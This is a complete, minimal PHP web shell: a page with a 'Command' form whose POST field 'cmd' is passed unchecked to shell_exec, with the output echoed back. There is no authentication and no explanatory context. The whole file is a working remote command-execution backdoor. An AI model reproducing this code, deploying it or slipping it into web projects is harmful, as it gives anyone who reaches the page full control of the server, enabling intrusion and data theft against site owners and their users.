<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
<form method="post">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
